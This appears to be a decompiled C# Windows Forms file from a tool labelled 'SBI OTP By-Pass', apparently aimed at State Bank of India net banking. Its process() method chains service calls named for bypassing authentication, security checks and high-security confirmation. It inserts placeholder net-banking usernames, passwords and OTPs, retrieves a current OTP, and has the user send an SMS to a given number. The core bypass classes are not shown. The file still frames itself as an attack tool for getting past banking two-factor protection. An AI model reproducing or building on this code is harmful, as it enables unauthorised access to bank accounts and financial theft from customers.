using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Windows.Forms;
using APP_FRAMEWORK;
using Bunifu.Framework.UI;
using NEXUS.Properties;

namespace NEXUS;

public class frmNewSBI : Form
{
	private Dictionary<string, string> dictionary_0;

	private IContainer components;

	private BunifuElipse bunifuElipse1;

	private Panel pnlHeader;

	private BunifuImageButton btnClose;

	private Label lblinfo;

	private Label lblTime;

	private ComboBox cmbBanks1;

	private Button button1;

	public frmNewSBI()
	{
		InitializeComponent();
		pnlHeader.MouseDown += StatClass.Header_MouseDown;
		pnlHeader.MouseMove += StatClass.Header_MouseMove;
		pnlHeader.MouseUp += StatClass.Header_MouseUp;
	}

	private void btnClose_Click(object sender, EventArgs e)
	{
		Dispose();
	}

	private void frmNewSBI_Load(object sender, EventArgs e)
	{
		new DataTable();
		cmbBanks1.Items.Clear();
		ComboBox.ObjectCollection items = cmbBanks1.Items;
		string item = "Select Bank Account";
		items.Add(item);
		Dictionary<string, string> dictionary = Staticm.SBI();
		foreach (string key in dictionary.Keys)
		{
			dictionary_0.Add(key, dictionary[key]);
			cmbBanks1.Items.Add(key);
		}
		cmbBanks1.SelectedIndex = 0;
	}

	private void process()
	{
		try
		{
			SbiService sbiService = new SbiService();
			SBIPaymentRequest sBIPaymentRequest = sbiService.SBIByPassAuthServiceRequest();
			if (sBIPaymentRequest != null)
			{
				string text = "Copy the sms text and send to mobile number:  ";
				MessageBox.Show(text + sBIPaymentRequest.phoneNumberForSmsSend);
				SBIPaymentRequest sBIPaymentRequest2 = sBIPaymentRequest;
				string username = "Enter sbi nb user here";
				sBIPaymentRequest2.Username = username;
				SBIPaymentRequest sBIPaymentRequest3 = sBIPaymentRequest;
				string password = "Enter sbi nb password here";
				sBIPaymentRequest3.Password = password;
				sBIPaymentRequest = sbiService.SBIByPassSecurityServiceRequest(sBIPaymentRequest);
				SBIPaymentRequest sBIPaymentRequest4 = sBIPaymentRequest;
				string otp = "Enter OTP into this";
				sBIPaymentRequest4.otp = otp;
				sBIPaymentRequest = sbiService.SBIByPassEnableHighSecurityConfirmServiceRequest(sBIPaymentRequest);
				SBIPaymentRequest sbiPaymentRequest = sBIPaymentRequest;
				sbiPaymentRequest = new SBISecureOtpService().getOtp(sbiPaymentRequest);
				_ = sbiPaymentRequest.currentOtp;
			}
			else
			{
				string text2 = "Error: ByPass failed";
				MessageBox.Show(text2);
			}
		}
		catch (Exception)
		{
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		process();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.bunifuElipse1 = new Bunifu.Framework.UI.BunifuElipse(this.components);
		this.pnlHeader = new System.Windows.Forms.Panel();
		this.btnClose = new Bunifu.Framework.UI.BunifuImageButton();
		this.lblinfo = new System.Windows.Forms.Label();
		this.lblTime = new System.Windows.Forms.Label();
		this.cmbBanks1 = new System.Windows.Forms.ComboBox();
		this.button1 = new System.Windows.Forms.Button();
		this.pnlHeader.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.btnClose).BeginInit();
		base.SuspendLayout();
		this.bunifuElipse1.ElipseRadius = 5;
		this.bunifuElipse1.TargetControl = this;
		this.pnlHeader.BackColor = System.Drawing.SystemColors.ControlDarkDark;
		this.pnlHeader.BackgroundImage = NEXUS.Properties.Resources.Topbar__0;
		this.pnlHeader.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
		this.pnlHeader.Controls.Add(this.btnClose);
		this.pnlHeader.Controls.Add(this.lblinfo);
		this.pnlHeader.Dock = System.Windows.Forms.DockStyle.Top;
		this.pnlHeader.ForeColor = System.Drawing.Color.FromArgb(17, 17, 18);
		this.pnlHeader.Location = new System.Drawing.Point(0, 0);
		this.pnlHeader.Name = "pnlHeader";
		this.pnlHeader.Size = new System.Drawing.Size(591, 22);
		this.pnlHeader.TabIndex = 1210;
		this.btnClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.btnClose.BackColor = System.Drawing.Color.Transparent;
		this.btnClose.Cursor = System.Windows.Forms.Cursors.Hand;
		this.btnClose.Image = NEXUS.Properties.Resources.power_button;
		this.btnClose.ImageActive = null;
		this.btnClose.Location = new System.Drawing.Point(564, 0);
		this.btnClose.Name = "btnClose";
		this.btnClose.Size = new System.Drawing.Size(26, 20);
		this.btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.btnClose.TabIndex = 1;
		this.btnClose.TabStop = false;
		this.btnClose.Zoom = 10;
		this.btnClose.Click += new System.EventHandler(btnClose_Click);
		this.lblinfo.AutoSize = true;
		this.lblinfo.BackColor = System.Drawing.Color.Transparent;
		this.lblinfo.Enabled = false;
		this.lblinfo.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblinfo.ForeColor = System.Drawing.Color.White;
		this.lblinfo.Location = new System.Drawing.Point(3, 3);
		this.lblinfo.Name = "lblinfo";
		this.lblinfo.Size = new System.Drawing.Size(133, 17);
		this.lblinfo.TabIndex = 0;
		this.lblinfo.Text = "SBI OTP By-Pass";
		this.lblTime.AutoSize = true;
		this.lblTime.Font = new System.Drawing.Font("Arial", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
		this.lblTime.ForeColor = System.Drawing.Color.Black;
		this.lblTime.Location = new System.Drawing.Point(8, 31);
		this.lblTime.Name = "lblTime";
		this.lblTime.Size = new System.Drawing.Size(96, 16);
		this.lblTime.TabIndex = 1211;
		this.lblTime.Text = "Select Bank : ";
		this.cmbBanks1.BackColor = System.Drawing.Color.FromArgb(255, 255, 255);
		this.cmbBanks1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbBanks1.ForeColor = System.Drawing.Color.Black;
		this.cmbBanks1.FormattingEnabled = true;
		this.cmbBanks1.Location = new System.Drawing.Point(107, 28);
		this.cmbBanks1.Name = "cmbBanks1";
		this.cmbBanks1.Size = new System.Drawing.Size(268, 21);
		this.cmbBanks1.TabIndex = 1212;
		this.button1.Location = new System.Drawing.Point(469, 120);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(75, 23);
		this.button1.TabIndex = 1213;
		this.button1.Text = "button1";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(button1_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(591, 367);
		base.Controls.Add(this.button1);
		base.Controls.Add(this.lblTime);
		base.Controls.Add(this.cmbBanks1);
		base.Controls.Add(this.pnlHeader);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Name = "frmNewSBI";
		this.Text = "frmNewSBI";
		base.Load += new System.EventHandler(frmNewSBI_Load);
		this.pnlHeader.ResumeLayout(false);
		this.pnlHeader.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.btnClose).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
